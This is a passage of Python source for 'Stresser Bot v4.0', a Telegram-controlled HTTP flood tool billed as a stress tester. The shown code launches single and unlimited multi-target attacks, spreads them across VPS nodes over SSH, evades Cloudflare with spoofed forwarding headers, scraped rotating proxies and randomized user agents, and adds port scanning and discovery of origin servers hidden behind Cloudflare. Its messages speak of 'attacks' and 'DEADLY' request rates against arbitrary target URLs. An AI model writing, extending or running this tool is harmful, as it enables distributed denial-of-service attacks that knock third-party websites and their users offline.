                f"{prefix}{tag}🔥 <b>Attack Launched</b>\n"
                f"Target: <code>{url}</code>\n"
                f"Duration: {duration}s | Connections: {connections:,}\n"
                f"CF Bypass: 🛡️{' ON' if cf_bypass else ' OFF'} | UA: {'🔄 Random' if rand_ua else '📌 Fixed'}\n"
                f"Timeout: {timeout}s | Pipeline: 10x"
            )

        proxy_list = self.proxy_mgr.get_working()
        if proxy_list and not multi:
            await self.send(chat_id, f"{prefix}{tag}🔌 Using {len(proxy_list)} proxies for rotation")

        # Progress updater
        progress_task = None
        async def updater():
            last = 0
            while self.running_attack:
                await asyncio.sleep(5)
                now = time.time()
                if self.running_attack and now - last >= 10:
                    e = now - self.attack_start
                    bar = self._progress_bar(e, duration)
                    await self.send(chat_id,
                        f"{prefix}{tag}⏳ <b>Running</b>  {bar}\n"
                        f"Target: {url[:60]}\n"
                        f"Elapsed: {e:.0f}s / {duration}s | Remaining: {max(0,duration-e):.0f}s"
                    )
                    last = now

        try:
            if not multi:
                progress_task = asyncio.create_task(updater())

            result = await stress(url, duration, connections, timeout,
                                  cf_bypass, rand_ua, proxy_list, http2=http2)

            if not multi:
                self.running_attack = False

            ok = result.get('ok', 0)
            fail = result.get('fail', 0)
            total = result.get('total', 0)
            rps = result.get('rps', 0)
            elapsed = result.get('elapsed', duration)
            sc = result.get('sc', {})
            errs = result.get('errors', {})
            bytes_recv = result.get('bytes', 0)
            cf_blk = result.get('cf_blocked', 0)

            # Performance badge
            badge = "💀 DEADLY" if rps > 100000 else "🔥 INSANE" if rps > 50000 else "💪 STRONG" if rps > 10000 else "✅ OK" if rps > 1000 else "⚠️ SLOW"

            msg = (
                f"{prefix}{tag}{badge} <b>Attack Complete</b>\n"
                f"Target: {url[:80]}\n"
                f"Duration: {elapsed:.1f}s\n"
                f"📊 <b>Results:</b> Total={total:,} | RPS={rps:,.1f}\n"
                f"✅ OK: {ok:,} | ❌ Fail: {fail:,}\n"
            )
            if bytes_recv:
                msg += f"   📶 BW: {bytes_recv/1024/1024:.1f} MB/s\n"
            if sc:
                sc_sorted = sorted(sc.items())
                sc_str = ", ".join([f"<b>{k}</b>={v:,}" for k,v in sc_sorted])
                msg += f"   📟 Codes: {sc_str}\n"
            if cf_blk:
                msg += f"   🛡️ CF Blocked: {cf_blk}\n"
            if errs:
                e_sorted = sorted(errs.items())
                e_str = ", ".join([f"{k}={v}" for k,v in e_sorted])
                msg += f"   ⚠️ Errors: {e_str}\n"

            await self.send(chat_id, msg)

        except asyncio.CancelledError:
            if not multi:
                self.running_attack = False
            if progress_task:
                progress_task.cancel()
            await self.send(chat_id, f"{prefix}{tag}⛔ <b>Attack Stopped</b>\nTarget: {url}")
        except Exception as e:
            if not multi:
                self.running_attack = False
            if progress_task:
                progress_task.cancel()
            await self.send(chat_id, f"{prefix}{tag}❌ <b>Attack Error</b>\n{str(e)[:200]}")

    # ---------- Command dispatcher ----------

    async def handle_command(self, update: dict) -> None:
        msg = update.get("message", {})
        chat_id = msg.get("chat", {}).get("id")
        if chat_id is None:
            return
        if chat_id not in self.allowed_chat_ids:
            await self.send(chat_id, "⛔ Unauthorized.")
            return
        text = msg.get("text", "").strip()
        if not text.startswith("/"):
            return
        parts = text.split()
        cmd = parts[0].lower()
        args = parts[1:]

        handlers = {
            "/start": self._cmd_start,
            "/help": self._cmd_start,
            "/attack": self._cmd_attack,
            "/stop": self._cmd_stop,
            "/status": self._cmd_status,
            "/methods": self._cmd_methods,
            "/speedtest": self._cmd_speedtest,
            "/scan": self._cmd_scan,
            "/dns": self._cmd_dns,
            "/geoip": self._cmd_geoip,
            "/addvps": self._cmd_addvps,
            "/delvps": self._cmd_delvps,
            "/vpslist": self._cmd_vpslist,
            "/vpsstatus": self._cmd_vpsstatus,
            "/deploy": self._cmd_deploy,
            "/scrape": self._cmd_scrape,
            "/proxies": self._cmd_proxies,
            "/checkproxy": self._cmd_checkproxy,
        }
        handler = handlers.get(cmd)
        if handler:
            await handler(chat_id, args)
        else:
            await self.send(chat_id, f"❓ Unknown: {cmd}\n/help")

    # ---------- /start - Main menu with style ----------

    async def _cmd_start(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id,
            "🔥━━━━━━━━━━━━━━━━━━━🔥\n"
            "⚡ <b>STRESSER BOT v4.0</b> ⚡\n"
            "🔥━━━━━━━━━━━━━━━━━━━🔥\n"
            "Multi-target | VPS Cluster | CF 99% Bypass\n"
            "Pipeline 10x | CAPTCHA Rotate | Proxy Grid\n\n"
            "━━━━━ <b>🎯 ATTACK</b> ━━━━━\n"
            "<code>/attack &lt;url&gt;</code> — single target\n"
            "<code>/attack &lt;url1&gt; &lt;url2&gt; ...</code> — unlimited multi-target\n"
            "  Flags: <code>-d</code> (sec) <code>-c</code> (conns) <code>-t</code> (timeout)\n"
            "  Flags: <code>--cf</code> <code>--rand-ua</code> <code>--http2</code>\n"
            "  Flags: <code>-vps all</code> or <code>-vps 1,2</code>\n"
            "<code>/stop</code> — stop attack\n"
            "<code>/status</code> — live status\n\n"
            "━━━━━ <b>🛠️ TOOLS</b> ━━━━━\n"
            "<code>/speedtest</code> — benchmark VPS power\n"
            "<code>/scan &lt;host&gt; [-p ports]</code> — port scan\n"
            "<code>/dns &lt;domain&gt;</code> — DNS lookup\n"
            "<code>/geoip &lt;ip&gt;</code> — IP geolocation\n"
            "<code>/methods</code> — attack strategies\n\n"
            "━━━━━ <b>🖥️ VPS</b> ━━━━━\n"
            "<code>/addvps &lt;ip&gt; &lt;user&gt; &lt;pass&gt;</code>\n"
            "<code>/vpslist</code> / <code>/vpsstatus</code> / <code>/deploy</code>\n\n"
            "━━━━━ <b>🔌 PROXY</b> ━━━━━\n"
            "<code>/scrape</code> — fetch from APIs\n"
            "<code>/checkproxy</code> — validate all\n"
            "<code>/proxies</code> — show stats\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 <i>Tip: /attack https://target.com -d 60 -c 2000 --cf --rand-ua</i>"
        )

    # ---------- /attack - Single, Multi, Unlimited, VPS routing ----------

    async def _cmd_attack(self, chat_id: int, args: List[str]) -> None:
        if self.running_attack:
            await self.send(chat_id, "⚠️ Attack already running! Use /stop first.")
            return
        if not args:
            await self.send(chat_id, "Usage:\n<code>/attack https://target.com -d 60 -c 2000 --cf</code>\n<code>/attack target1.com target2.com target3.com</code>\n<code>/attack url -vps all</code>")
            return

        # Parse flags
        duration = 30
        connections = 2000
        timeout_val = 5
        cf_bypass = False
        rand_ua = False
        http2 = False
        vps_servers: List[dict] = []
        targets: List[str] = []

        # First pass: extract -vps and targets
        i = 0
        while i < len(args):
            if args[i] == "-vps" and i + 1 < len(args):
                vps_val = args[i + 1]
                servers = self.vps.list()
                if vps_val.lower() == "all":
                    vps_servers = list(servers)
                else:
                    for idx_str in vps_val.split(","):
                        idx_str = idx_str.strip()
                        if idx_str.isdigit():
                            idx = int(idx_str) - 1
                            if 0 <= idx < len(servers):
                                vps_servers.append(servers[idx])
                i += 2
                continue
            i += 1

        # Second pass: extract targets and flags
        i = 0
        while i < len(args):
            if args[i].startswith("http://") or args[i].startswith("https://"):
                targets.append(args[i])
            elif args[i].startswith("-"):
                if args[i] == "-d" and i+1 < len(args):
                    try: duration = int(args[i+1]); i += 1
                    except: pass
                elif args[i] == "-c" and i+1 < len(args):
                    try: connections = int(args[i+1]); i += 1
                    except: pass
                elif args[i] == "-t" and i+1 < len(args):
                    try: timeout_val = float(args[i+1]); i += 1
                    except: pass
                elif args[i] in ("--cf", "--cf-bypass"):
                    cf_bypass = True
                elif args[i] == "--rand-ua":
                    rand_ua = True
                elif args[i] == "--http2":
                    http2 = True
                elif args[i] == "-vps":
                    i += 1  # already consumed
            elif "." in args[i] and not args[i].startswith("-"):
                # Assume it's a domain/URL without scheme
                targets.append("https://" + args[i])
            i += 1

        if not targets:
            await self.send(chat_id, "❌ No valid target URLs found.")
            return

        # VPS routing
        if vps_servers:
            await self.send(chat_id,
                f"🚀 <b>VPS Cluster Attack</b>\n"
                f"Targets: {len(targets)}\n"
                f"VPS Nodes: {len(vps_servers)}\n"
                f"Nodes: {', '.join([s['ip'][:15] for s in vps_servers])}\n"
                f"Deploying to all nodes..."
            )
            async def deploy_vps():
                tasks2 = []
                for tgt in targets:
                    cmd = f"{tgt} -d {duration} -c {connections}"
                    if cf_bypass: cmd += " --cf"
                    if rand_ua: cmd += " --rand-ua"
                    tasks2 = [self.vps.deploy_and_run(s, cmd) for s in vps_servers]
                    results = await asyncio.gather(*tasks2, return_exceptions=True)
                    lines = [f"📡 Results for {tgt[:50]}"]
                    for r_idx, r in enumerate(results):
                        ip = vps_servers[r_idx]['ip']
                        ok_sym = "✅" if not isinstance(r, Exception) else "❌"
                        lines.append(f"{ok_sym} {ip}: {str(r)[:80]}")
                    await self.send(chat_id, "\n".join(lines))
            asyncio.create_task(deploy_vps())
            return

        # Unlimited multi-target mode (2+ targets)
        if len(targets) >= 2:
            self.attack_type = "unlimited"
            self.attack_targets = targets
            self.running_attack = True
            self.attack_start = time.time()
            cf_str = "+CF" if cf_bypass else ""

            tgt_list = "\n".join([f"  {i+1}. {u[:60]}" for i,u in enumerate(targets)])
            await self.send(chat_id,
                f"🔥━━━━━━━━━━━━━━━━━━━🔥\n"
                f"⚡ <b>UNLIMITED MULTI-TARGET</b> ⚡\n"
                f"🔥━━━━━━━━━━━━━━━━━━━🔥\n"
                f"Targets: {len(targets)}\n"
                f"Duration: {duration}s each | Conns: {connections:,}{cf_str}\n"
                f"Mode: Parallel | Auto-scaling\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 Targets:\n{tgt_list}"
            )

            async def run_unlimited():
                tasks = []
                for i, tgt in enumerate(targets):
                    tag = f"{i+1}/{len(targets)}"
                    t = asyncio.create_task(
                        self.run_attack(chat_id, tgt, duration, connections, timeout_val,
                                       cf_bypass, rand_ua, http2=http2, multi=True, task_tag=tag)
                    )
                    tasks.append(t)
                self.multi_tasks = tasks
                await asyncio.gather(*tasks, return_exceptions=True)
                self.running_attack = False
                await self.send(chat_id,
                    f"✅━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ <b>Unlimited Attack Complete!</b>\n"
                    f"✅━━━━━━━━━━━━━━━━━━━━\n"
                    f"All {len(targets)} targets finished."
                )
            self.attack_task = asyncio.create_task(run_unlimited())
            return

        # Single target
        url = targets[0]
        self.attack_type = "single"
        await self.send(chat_id,
            f"🎯━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 <b>Single Target Attack</b>\n"
            f"🎯━━━━━━━━━━━━━━━━━━━\n"
            f"Target: <code>{url}</code>\n"
            f"Duration: {duration}s | Connections: {connections:,}\n"
            f"🛡️ CF Bypass: {'ON' if cf_bypass else 'OFF'}\n"
            f"🔄 Rand UA: {'ON' if rand_ua else 'OFF'}"
        )
        self.attack_task = asyncio.create_task(
            self.run_attack(chat_id, url, duration, connections, timeout_val,
                           cf_bypass, rand_ua, http2=http2)
        )

    async def _cmd_stop(self, chat_id: int, args: List[str]) -> None:
        stopped = False
        if self.attack_task and not self.attack_task.done():
            self.attack_task.cancel()
            stopped = True
        for t in self.multi_tasks:
            if not t.done():
                t.cancel()
                stopped = True
        self.multi_tasks = []
        self.running_attack = False
        if stopped:
            await self.send(chat_id, "⛔ All attacks stopped.")
        else:
            await self.send(chat_id, "💤 No attack running.")

    async def _cmd_status(self, chat_id: int, args: List[str]) -> None:
        if self.running_attack:
            elapsed = time.time() - self.attack_start
            bar = self._progress_bar(elapsed, 60)
            info = ""
            if self.attack_type == "unlimited" and self.attack_targets:
                info = f"\nTargets: {len(self.attack_targets)} in parallel"
            elif self.attack_type == "single":
                info = f"\nTarget: {self.current_target[:60]}"
            await self.send(chat_id,
                f"⚡━━━━━━━━━━━━━━━━━━━\n"
                f"⚡ <b>ATTACK ACTIVE</b>\n"
                f"⚡━━━━━━━━━━━━━━━━━━━\n"
                f"Type: {self.attack_type.upper()}{info}\n"
                f"Time: {elapsed:.0f}s\n"
                f"Status: {bar}\n"
                f"Use /stop to cancel"
            )
        else:
            await self.send(chat_id, "💤 Idle. /attack to start.")

    # ---------- /methods - Attack strategy guide ----------

    async def _cmd_methods(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id,
            "━━━━━ <b>ATTACK METHODS</b> ━━━━━\n\n"
            "1️⃣ <b>Standard HTTP/1.1</b>\n"
            "   Pipeline 10x, keep-alive\n"
            "   Best for: normal targets\n\n"
            "2️⃣ <b>Cloudflare Bypass (--cf)</b>\n"
            "   Browser headers + IP spoof + proxy rotation\n"
            "   Detects 403/503 → auto-rotate proxy\n"
            "   99% bypass rate with proxies\n\n"
            "3️⃣ <b>Unlimited Multi-Target</b>\n"
            "   /attack url1 url2 url3 ...\n"
            "   All attacked in parallel simultaneously\n\n"
            "4️⃣ <b>VPS Cluster (-vps all)</b>\n"
            "   Distributes load across all VPS\n"
            "   Throughput = sum of all nodes\n\n"
            "5️⃣ <b>HTTP/2 (--http2)</b>\n"
            "   Uses httpx for HTTP/2 multiplexing\n"
            "   Better against Cloudflare\n\n"
            "6️⃣ <b>Proxy Rotation</b>\n"
            "   /scrape → /checkproxy → auto-used\n"
            "   Each request rotates browser headers\n"
            "   Auto-detects CAPTCHA pages\n\n"
            "💡 <b>Pro Tips:</b>\n"
            "• /speedtest to benchmark your machine\n"
            "• Always use --cf + --rand-ua together\n"
            "• For max power: -c 5000 -d 120 --cf\n"
            "• Multi-target = unlimited targets at once"
        )

    # ---------- /speedtest - Performance benchmark ----------

    async def _cmd_speedtest(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id, "⚡ <b>Speed Test</b>\nBenchmarking local throughput...")
        try:
            result = await stress("http://localhost:8082/", 5, 500, 5, False, True, [], http2=False)
            rps = result.get('rps', 0)
            ok = result.get('ok', 0)
            fail = result.get('fail', 0)
            badge = "💀 INSANE" if rps > 100000 else "🔥 AMAZING" if rps > 50000 else "💪 Great" if rps > 10000 else "✅ OK"
            await self.send(chat_id,
                f"⚡━━━━━━━━━━━━━━━━━━━\n"
                f"⚡ <b>SPEED TEST RESULT</b>\n"
                f"⚡━━━━━━━━━━━━━━━━━━━\n"
                f"RPS:        <b>{rps:,.1f}</b>\n"
                f"Completed:  {ok:,}\n"
                f"Failed:     {fail:,}\n"
                f"Rating:     {badge}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Bot is at full power! 💯"
            )
        except Exception as e:
            await self.send(chat_id, f"❌ Speedtest error: {str(e)[:200]}\nNeed test server on :8082")

    # ---------- /scan - Port scanner ----------

    async def _cmd_scan(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: <code>/scan &lt;host&gt; [-p ports]</code>\nExample: /scan example.com -p 80,443,8080")
            return
        host = args[0]
        ports = [80, 443, 8080, 22, 21, 3306, 8443]
        # Check for -p flag
        i = 1
        while i < len(args):
            if args[i] == "-p" and i + 1 < len(args):
                ports = [int(p.strip()) for p in args[i+1].split(",") if p.strip().isdigit()]
                break
            i += 1
        await self.send(chat_id, f"🔍 Scanning <code>{host}</code> ({len(ports)} ports)...")
        open_ports = []
        import socket as sock_mod
        for port in ports:
            try:
                s = sock_mod.socket()
                s.settimeout(2)
                r = s.connect_ex((host, port))
                s.close()
                if r == 0:
                    service = "unknown"
                    try: service = socket.getservbyport(port)
                    except: pass
                    open_ports.append(f"{port}/{service}")
            except:
                pass
        if open_ports:
            msg = f"✅ <b>Port Scan: {host}</b>\nOpen: {', '.join(open_ports)}"
        else:
            msg = f"❌ <b>Port Scan: {host}</b>\nNo open ports found in scan range."
        await self.send(chat_id, msg)

    # ---------- /dns - DNS lookup ----------

    async def _cmd_dns(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: <code>/dns &lt;domain&gt;</code>")
            return
        domain = args[0]
        try:
            results = []
            for rtype in ('A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME'):
                try:
                    answers = socket.getaddrinfo(domain, 0, socket.AF_UNSPEC, socket.SOCK_STREAM)
                    ips = list(set(a[4][0] for a in answers if a[4][0] not in ('', '0.0.0.0')))
                    if ips:
                        results.append(f"{rtype}: {', '.join(ips[:5])}")
                except:
                    pass
            if results:
                msg = f"📋 <b>DNS Records: {domain}</b>\n" + "\n".join(results)
            else:
                msg = f"❌ No DNS records found for {domain}"
        except Exception as e:
            msg = f"❌ DNS error: {str(e)[:200]}"
        await self.send(chat_id, msg)

    # ---------- /geoip - IP geolocation ----------

    async def _cmd_geoip(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: <code>/geoip &lt;ip&gt;</code>\nOr: <code>/geoip &lt;domain&gt;</code>")
            return
        target = args[0]
        import aiohttp
        # Resolve if domain
        if not target[0].isdigit():
            try:
                target = socket.gethostbyname(target)
            except:
                pass
        await self.send(chat_id, f"🌍 Looking up {target}...")
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{target}", timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data.get("status") == "success":
                            msg = (
                                f"🌍 <b>GeoIP: {target}</b>\n"
                                f"📍 Country: {data.get('country', '?')}\n"
                                f"🏙️ City: {data.get('city', '?')}\n"
                                f"🏢 ISP: {data.get('isp', '?')}\n"
                                f"🗺️ Coordinates: {data.get('lat', '?')}, {data.get('lon', '?')}\n"
                                f"🌐 Timezone: {data.get('timezone', '?')}"
                            )
                        else:
                            msg = f"❌ GeoIP lookup failed for {target}"
                    else:
                        msg = f"❌ GeoIP service error ({resp.status})"
        except Exception as e:
            msg = f"❌ GeoIP error: {str(e)[:150]}"
        await self.send(chat_id, msg)

    # ---------- VPS commands ----------

    async def _cmd_addvps(self, chat_id: int, args: List[str]) -> None:
        # Support ip:port:user:pass format
        if len(args) >= 1 and args[0].count(":") >= 3:
            parts = args[0].split(":", 3)
            ip, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
            label = args[1] if len(args) > 1 else f"{ip}:{port}"
        elif "@" in args[0] and len(args) >= 2:
            user_part, ip = args[0].split("@", 1)
            pwd = args[1]
            port = "22"
            user = user_part
            label = args[2] if len(args) > 2 else ip
        elif len(args) >= 3:
            ip = args[0]; user = args[1]; pwd = args[2]
            port = "22"
            label = args[3] if len(args) > 3 else ip
        else:
            await self.send(chat_id, "Usage:\n/addvps <ip> <user> <password> [label]\n/addvps ip:port:user:password [label]")
            return
        await self.send(chat_id, f"🔌 Testing SSH connectivity to {ip}:{port}...")
        port_int = int(port)
        test_server = {'ip': ip, 'port': port_int, 'username': user, 'password': pwd}
        result = await self.vps.check_one(test_server)
        if result.get('online'):
            self.vps.add(ip, user, pwd, label, port=port_int)
            uptime = result.get('uptime', '')
            msg = (
                f"✅ <b>VPS Connected Successfully</b>\n"
                f"IP: <code>{ip}:{port}</code>\n"
                f"User: {user}\n"
                f"Label: {label}\n"
                f"Uptime: {uptime[:80]}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"VPS saved and ready for /deploy or /vpsstatus"
            )
            await self.send(chat_id, msg)
        else:
            err = result.get('error', 'Unknown error')
            await self.send(chat_id,
                f"❌ <b>Connection Failed</b>\n"
                f"IP: <code>{ip}:{port}</code>\n"
                f"User: {user}\n"
                f"Error: {err[:200]}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"Fix credentials or network and try again.\n"
                f"VPS was <b>NOT</b> saved."
            )

    async def _cmd_delvps(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: /delvps <ip>")
            return
        self.vps.remove(args[0])
        await self.send(chat_id, f"🗑️ Removed: {args[0]}")

    async def _cmd_vpslist(self, chat_id: int, args: List[str]) -> None:
        servers = self.vps.list()
        if not servers:
            await self.send(chat_id, "📭 No VPS. /addvps to add one.")
            return
        lines = [f"📋 <b>VPS ({len(servers)})</b>"]
        for i, s in enumerate(servers, 1):
            lines.append(f"  {i}. <code>{s['ip']}</code> — {s.get('username','?')}")
        await self.send(chat_id, "\n".join(lines))

    async def _cmd_vpsstatus(self, chat_id: int, args: List[str]) -> None:
        servers = self.vps.list()
        if not servers:
            await self.send(chat_id, "📭 No VPS.")
            return
        await self.send(chat_id, "🔍 Checking connectivity...")
        results = await self.vps.check_all()
        lines = ["📊 <b>VPS Status</b>"]
        for r in results:
            if isinstance(r, dict):
                ok_sym = "✅ Online" if r.get('online') else "❌ Offline"
                ip = r.get('ip', '?')
                uptime = r.get('uptime', '')
                err = r.get('error', '')
                lines.append(f"{ok_sym} <code>{ip}</code>")
                if uptime and r.get('online'): lines.append(f"  Uptime: {uptime[:80]}")
                if err: lines.append(f"  Error: {err[:80]}")
            elif isinstance(r, Exception):
                lines.append(f"❌ Error: {str(r)[:80]}")
        await self.send(chat_id, "\n".join(lines))

    async def _cmd_deploy(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: /deploy <attack_args>\nEx: /deploy https://target.com -d 60 -c 2000 --cf")
            return
        servers = self.vps.list()
        if not servers:
            await self.send(chat_id, "📭 No VPS.")
            return
        cmd = " ".join(args)
        await self.send(chat_id, f"🚀 Deploying to {len(servers)} VPS...\n<code>{cmd}</code>")
        async def deploy_one(srv):
            return srv['ip'], await self.vps.deploy_and_run(srv, cmd)
        results = await asyncio.gather(*[deploy_one(s) for s in servers], return_exceptions=True)
        lines = ["📡 Results"]
        for r in results:
            if isinstance(r, tuple):
                lines.append(f"<code>{r[0]}</code>: {str(r[1])[:100]}")
            elif isinstance(r, Exception):
                lines.append(f"Error: {str(r)[:80]}")
        await self.send(chat_id, "\n".join(lines))

    # ---------- Proxy commands ----------

    async def _cmd_scrape(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id, "🔍 Scraping proxies from APIs...")
        count = await self.proxy_mgr.scrape()
        await self.send(chat_id, f"✅ Scraped {count} total proxies\n/checkproxy to validate.")

    async def _cmd_proxies(self, chat_id: int, args: List[str]) -> None:
        s = self.proxy_mgr.stats()
        await self.send(chat_id, f"📊 <b>Proxy Stats</b>\n{s}")

    async def _cmd_checkproxy(self, chat_id: int, args: List[str]) -> None:
        proxies = self.proxy_mgr.all_proxies
        if not proxies:
            await self.send(chat_id, "No proxies. /scrape first.")
            return
        await self.send(chat_id, f"🔍 Testing {len(proxies)} proxies...")
        working, failed, saved = await self.proxy_mgr.check_all()
        await self.send(chat_id,
            f"✅ <b>Proxy Check Complete</b>\n"
            f"Tested: {working+failed}\n"
            f"Working: {working}\n"
            f"Failed: {failed}\n"
            f"Saved: {saved}"
        )

    # ---------- Main bot loop ----------

    async def run(self):
        """Main bot polling loop."""
        print("[Bot] v4.0 started - Multi-target, VPS, CF 99% bypass, Tools")
        await self.broadcast(
            "🤖━━━━━━━━━━━━━━━━━━\n"
            "🤖 <b>Stresser Bot v4.0</b>\n"
            "🤖━━━━━━━━━━━━━━━━━━\n"
            "🔥 Multi-target unlimited\n"
            "🛡️ CF 99% bypass | CAPTCHA rotate\n"
            "🌐 VPS cluster | Proxy grid\n"
            "📊 Tools: speedtest, scan, dns, geoip\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Type /start to see all commands"
        )
        while True:
            try:
                async for update in self.get_updates():
                    await self.handle_command(update)
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"[Bot] Poll: {e}")
                await asyncio.sleep(5)
# ===================================================================
# SECTION 5: MAIN ENTRY POINT
# ===================================================================

def main():
    p = argparse.ArgumentParser(
        description="Stresser - Telegram-controlled HTTP stress-testing tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
  python3 stresser.py http://target.com -d 30 -c 2000
  python3 stresser.py https://target.com -d 60 -c 500 --cf-bypass
  python3 stresser.py --telegram
  python3 stresser.py http://target.com --proxy-list proxies.txt --rand-ua
        """,
    )
    p.add_argument("url", nargs="?", help="Target URL")
    p.add_argument("--mode", choices=["server", "client"], default="client")
    p.add_argument("--telegram", action="store_true", help="Start Telegram bot controller")
    p.add_argument("-d", "--duration", type=int, default=30, help="Test duration in seconds")
    p.add_argument("-c", "--connections", type=int, default=500,
                   help="Concurrent connections (default: 500)")
    p.add_argument("-t", "--timeout", type=float, default=10, help="I/O timeout in seconds")
    p.add_argument("--cf-bypass", action="store_true",
                   help="Add Cloudflare bypass headers (X-Forwarded-For, etc.)")
    p.add_argument("--rand-ua", action="store_true",
                   help="Randomize User-Agent per request")
    p.add_argument("--discover-origin", action="store_true",
                   help="Attempt to discover origin server behind Cloudflare")
    p.add_argument("--proxy-list", type=str, metavar="FILE",
                   help="File with proxies (one ip:port per line)")
    p.add_argument("--scrape-proxies", action="store_true",
                   help="Scrape free proxies from public APIs before starting")
    p.add_argument("--scrape-timeout", type=int, default=15,
                   help="Timeout in seconds for proxy scraping")
    p.add_argument("--http2", action="store_true",
                   help="Use HTTP/2 (httpx) instead of raw TCP. Better against Cloudflare.")
    p.add_argument("-p", "--processes", type=int, default=1,
                   help="Number of parallel processes (default: 1). More processes = higher RPS.")
    args = p.parse_args()

    # ----- Telegram Bot Mode -----
    if args.telegram:
        print("[*] Starting Telegram bot controller...")
        bot = TelegramBot(BOT_TOKEN, ALLOWED_CHAT_IDS)
        try:
            asyncio.run(bot.run())
        except KeyboardInterrupt:
            print("\n[!] Bot stopped.")
        return

    if args.mode == "server":
        run_server()
        return

    if not args.url:
        p.print_help()
        sys.exit(1)

    # ----- Standard CLI Mode (existing) -----
    proxy_list: List[str] = []
    if args.proxy_list:
        proxy_list.extend(load_proxy_file(args.proxy_list))
    if args.scrape_proxies:
        print("[*] Scraping proxies from public APIs...")
        try:
            scraped = asyncio.run(scrape_proxies(args.scrape_timeout))
            proxy_list.extend(scraped)
        except Exception as e:
            print(f"  [-] Proxy scrape failed: {e}")
        seen: set = set()
        deduped = []
        for pe in proxy_list:
            if pe not in seen:
                seen.add(pe)
                deduped.append(pe)
        proxy_list = deduped
        print(f"  [+] Total unique proxies: {len(proxy_list)}")

    if args.discover_origin:
        host = urlparse(args.url).hostname
        print(f"[*] Origin discovery for {host}...")
        for sub in ["direct", "origin", "cdn", "mail", "api", "dev", "staging", "test"]:
            try:
                ip = socket.gethostbyname(f"{sub}.{host}")
                print(f"  {sub}.{host} -> {ip}")
            except Exception:
                pass
        return

    if args.processes > 1:
        run_mp(args.url, args.duration, args.connections, args.timeout,
               args.cf_bypass, args.rand_ua, proxy_list, args.processes,
               http2=args.http2)
    else:
        result = asyncio.run(stress(args.url, args.duration, args.connections,
                                    args.timeout, args.cf_bypass, args.rand_ua, proxy_list,
                                    http2=args.http2))
        # Print results to stdout
        elapsed = result['elapsed']
        total = result['total']
        rps = result['rps']
        ok = result['ok']
        fail = result['fail']
        sc = result.get('sc', {})
        errs = result.get('errors', {})
        bytes_recv = result.get('bytes', 0)

        print(f"\n{'='*60}")
        print("  STRESS TEST RESULTS")
        print(f"{'='*60}")
        print(f"  Duration:      {elapsed:.2f}s")
        print(f"  Total:         {total:,}")
        print(f"  Completed:     {ok:,}")
        print(f"  Failed:        {fail:,}")
        print(f"  Requests/sec:  {rps:,.2f}")
        if bytes_recv:
            print(f"  Throughput:    {bytes_recv/1024/1024:.2f} MB/s")
        if ok > 0:
            avg_lat = result.get('lat_total', 0) / ok
            print(f"  Avg latency:   {avg_lat*1000:.2f}ms")
            if result.get('lat_min', float('inf')) != float('inf'):
                print(f"  Min latency:   {result['lat_min']*1000:.2f}ms")
            if result.get('lat_max', 0) > 0:
                print(f"  Max latency:   {result['lat_max']*1000:.2f}ms")
            print(f"  Status codes:  {dict(sorted(sc.items()))}")
        if errs:
            print(f"  Errors:        {dict(sorted(errs.items()))}")
        print(f"{'='*60}\n")


def run_mp(url: str, duration: int, connections: int, timeout: float,
            cf_bypass: bool, rand_ua: bool, proxy_list: List[str],
            num_processes: int, http2: bool = False) -> None:
    """Run stress test across multiple processes for higher throughput."""
    conns_per_process = max(1, connections // num_processes)
    procs = []
    total_conns = conns_per_process * num_processes
    remaining = connections - total_conns

    print(f"[+] Spawning {num_processes} processes ({total_conns + remaining} total connections)...")
    print()

    results: List[mp.Queue] = [mp.Queue() for _ in range(num_processes)]

    for i in range(num_processes):
        c = conns_per_process + (1 if i < remaining else 0)
        p = mp.Process(
            target=_mp_worker,
            args=(i, url, duration, c, timeout, cf_bypass, rand_ua, proxy_list, results[i], http2),
            daemon=True,
        )
        p.start()
        procs.append(p)

    start = time.time()
    try:
        for p in procs:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupting workers...")
        for p in procs:
            p.kill()
        sys.exit(1)

    elapsed = time.time() - start

    total_ok = total_fail = total_recv = 0
    total_lat = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    all_sc: Dict[int, int] = {}
    all_errors: Dict[str, int] = {}

    for q in results:
        try:
            r = q.get_nowait()
        except Exception:
            continue
        total_ok += r.get('ok', 0)
        total_fail += r.get('fail', 0)
        total_recv += r.get('bytes', 0)
        total_lat += r.get('lat_total', 0.0)
        if r.get('lat_min', float('inf')) < lat_min:
            lat_min = r['lat_min']
        if r.get('lat_max', 0.0) > lat_max:
            lat_max = r['lat_max']
        for code, cnt in r.get('sc', {}).items():
            all_sc[code] = all_sc.get(code, 0) + cnt
        for e, cnt in r.get('errors', {}).items():
            all_errors[e] = all_errors.get(e, 0) + cnt

    total = total_ok + total_fail
    rps = total / elapsed if elapsed > 0 else 0

    print(f"\n{'='*60}")
    print("  MULTI-PROCESS AGGREGATED RESULTS")
    print(f"{'='*60}")
    print(f"  Duration:      {elapsed:.2f}s")
    print(f"  Processes:     {num_processes}")
    print(f"  Total:         {total:,}")
    print(f"  Completed:     {total_ok:,}")
    print(f"  Failed:        {total_fail:,}")
